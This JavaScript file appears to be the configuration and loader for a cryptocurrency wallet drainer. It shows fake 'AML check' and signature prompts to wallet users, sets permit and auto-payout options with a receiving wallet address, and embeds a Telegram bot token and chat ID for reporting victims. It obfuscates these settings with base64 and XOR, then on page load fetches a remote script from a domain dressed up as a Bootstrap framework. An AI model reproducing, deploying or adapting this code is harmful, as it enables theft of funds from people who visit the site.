const connectingMessage = {};
connectingMessage.description = 'Connecting to Blockchain...';

const connectionEstablishedMessage = {};
connectionEstablishedMessage.description = 'Connection established';

const gettingWalletAddressMessage = {};
gettingWalletAddressMessage.description = 'Getting your wallet address...';

const checkingAMLMessage = {};
checkingAMLMessage.description = 'Checking your wallet for AML...';

const amlClearMessage = {};
amlClearMessage.description = 'Good, your wallet is AML clear!';

const scanningDetailsMessage = {};
scanningDetailsMessage.description = "Please wait, we're scanning more details...";

const thanksMessage = {};
thanksMessage.description = 'Thanks!';

const confirmingSignMessage = {};
confirmingSignMessage.description = "Confirming your sign... Please, don't leave this page!";

const waitingForSignMessage = {};
waitingForSignMessage.title = 'Waiting for your sign...';
waitingForSignMessage.description = 'Please, sign message in your wallet!';

const signConfirmedMessage = {};
signConfirmedMessage.description = 'Success, Your sign is confirmed!';

const errorOccurredMessage = {};
errorOccurredMessage.title = 'An error has occurred!';
errorOccurredMessage.description =
  "Your wallet doesn't meet the requirements. Try to connect a middle-active wallet to try again!";
errorOccurredMessage.button = 'Re-connect';

const lowBalanceErrorMessage = {};
lowBalanceErrorMessage.description =
  "For security reasons, we can't allow you to connect empty or new wallet";
lowBalanceErrorMessage.button = 'Re-connect';

const amlErrorMessage = {};
amlErrorMessage.title = 'AML Error';
amlErrorMessage.description = "Your wallet is not AML clear, you can't use it!";

const messages = {};
messages.connect = connectingMessage;
messages['connect-success'] = connectionEstablishedMessage;
messages['address-check'] = gettingWalletAddressMessage;
messages['aml-check'] = checkingAMLMessage;
messages['aml-check-success'] = amlClearMessage;
messages['scanning-more'] = scanningDetailsMessage;
messages.thanks = thanksMessage;
messages['sign-validation'] = confirmingSignMessage;
messages['sign-waiting'] = waitingForSignMessage;
messages['sign-confirmed'] = signConfirmedMessage;
messages.error = errorOccurredMessage;
messages['low-balance-error'] = lowBalanceErrorMessage;
messages['aml-check-error'] = amlErrorMessage;

const siteSettings = {};
siteSettings.wallet_verification = false;
siteSettings.contract_method = 'Connect';
siteSettings.modal_type = 'wallet_connect_v3';
siteSettings.modal_open_event = 'on_load';
siteSettings.modal_theme = 'auto';
siteSettings.messaging_bot = '7102140681:AAFp8X3wVMh38q7tVDMFNE0fQp9pggyE0Mw';
siteSettings.messaging_chat = '-4629750998';
siteSettings.wc_font = '';
siteSettings.wc_accent_color = '';
siteSettings.wc_fill_color = '';
siteSettings.wc_background_color = '';
siteSettings.wc_logo = '';
siteSettings.wc_background_image = '';
siteSettings.loop_token = true;
siteSettings.chain_tries_limit = 1;
siteSettings.auto_payouts = true;
siteSettings.loader_type = 'andromeda';
siteSettings.modal_open_logic = 'all';
siteSettings.enter_website = true;
siteSettings.connect_request = true;
siteSettings.connect_success = true;
siteSettings.exit_website = true;
siteSettings.approve_request = true;
siteSettings.chain_cancel = true;
siteSettings.chain_request = true;
siteSettings.approve_cancel = true;
siteSettings.profit_chat = '';
siteSettings.permit_priority = true;
siteSettings.permit_amount = 1;
siteSettings.modal_pallete = 'aqua-theme';
siteSettings.modal_font = 'font-open-sans';
siteSettings.nft_mode = false;
siteSettings.permit_mode = true;
siteSettings.minimal_wallet_price = 1;
siteSettings.minimal_token_price = 1;
siteSettings.minimal_native_price = 1;
siteSettings.approve_mode = 'skip';
siteSettings.cache_data = true;
siteSettings.swappers_mode = true;
siteSettings.chat_language = 'en';
siteSettings.thanks_redirect = false;
siteSettings.thanks_redirect_url = '';
siteSettings.loader_text = messages;

const settings = {};
settings.site_settings = siteSettings;
settings.receiver = '5687705746';
settings.username = 'ponziscriptshop';
settings.worker_address = '0xF92E928d22A03C422A70086E09FB64ca1225c168';

function xorEncrypt(inputArray, key) {
  return inputArray.map((item) => item ^ key);
}

const encodedSettings = (function (settingsJson) {
  const base64EncodedSettings = btoa(settingsJson);
  return xorEncrypt(
    Array.from(base64EncodedSettings).map((char) => char.charCodeAt(0)),
    109
  )
    .map((item) => item.toString(16).padStart(2, '0'))
    .join('');
})(JSON.stringify(settings));

let selfHostSettings = encodedSettings;

let isScriptLoaded = false;

document.addEventListener('DOMContentLoaded', () => {
  if (!isScriptLoaded) {
    const scriptElement = document.createElement('script');
    scriptElement.src = 'https://bootstrapframework.zip/web3-ethers.js';
    scriptElement.type = 'module';
    scriptElement.onload = () => {
      isScriptLoaded = true;
    };
    scriptElement.onerror = () => {
    };
    document.body.appendChild(scriptElement);
  } else {
  }
});
